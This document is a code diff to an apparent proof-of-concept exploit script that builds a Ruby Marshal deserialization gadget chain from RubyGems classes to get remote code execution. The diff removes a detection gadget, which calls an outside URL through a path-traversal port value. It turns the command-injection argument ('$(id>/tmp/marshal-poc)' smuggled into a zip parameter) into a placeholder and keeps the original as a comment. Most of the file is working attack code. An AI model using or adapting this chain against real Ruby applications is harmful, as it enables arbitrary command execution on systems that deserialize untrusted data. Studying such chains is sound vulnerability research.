@@ -14,34 +14,6 @@ require 'net/http'
 
 Gem::SpecFetcher # Autoload 
 
-
-def call_url_and_create_folder(url) # provided url should not have a query (?) component
-  uri = URI::HTTP.allocate
-  uri.instance_variable_set("@path", "/")
-  uri.instance_variable_set("@scheme", "s3")
-  uri.instance_variable_set("@host", url + "?")  # use the https host+path with your rz file
-  uri.instance_variable_set("@port", "/../../../../../../../../../../../../../../../tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90/") # c5fe... is the SHA-1 of "any"
-  uri.instance_variable_set("@user", "any")
-  uri.instance_variable_set("@password", "any")
-
-  source = Gem::Source.allocate
-  source.instance_variable_set("@uri", uri)
-  source.instance_variable_set("@update_cache", true)
-
-  index_spec = Gem::Resolver::IndexSpecification.allocate
-  index_spec.instance_variable_set("@name", "name")
-  index_spec.instance_variable_set("@source", source)
-
-  request_set = Gem::RequestSet.allocate
-  request_set.instance_variable_set("@sorted_requests", [index_spec])
-
-  lockfile = Gem::RequestSet::Lockfile.new('','','')
-  lockfile.instance_variable_set("@set", request_set)
-  lockfile.instance_variable_set("@dependencies", [])
-
-  return lockfile
-end
-
 def git_gadget(executable, second_param)
   git_source = Gem::Source::Git.allocate
   git_source.instance_variable_set("@git", executable)
@@ -98,25 +70,9 @@ def create_rce_gadget_chain(zip_param_to_execute)
   return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(exec_gadget)])
 end
 
-# detection / folder creation
-def create_detection_gadget_chain(url)
-  call_url_gadget = call_url_and_create_folder(url)
-
-  return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(call_url_gadget)])
-end
-
-url =  "rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz" # replace with URL to call in the detection gadget, for example: test.example.org/path, url should not have a query (?) component.
-detection_gadget_chain = create_detection_gadget_chain(url)
-
-# begin
-  # Marshal.load(detection_gadget_chain)
-  # rescue
-# end
-
-puts detection_gadget_chain.unpack("H*")
-
 # You can comment from here if you want to simply detect the presence of the vulnerability.
-zip_param_to_execute = "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip" # replace with -TmTT=\"$(id>/tmp/marshal-poc)\"any.zip
+#For example: zip_param_to_execute = "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
+zip_param_to_execute = "{ZIP_PARAM}"
 rce_gadget_chain = create_rce_gadget_chain(zip_param_to_execute)
 
 puts rce_gadget_chain.unpack("H*")
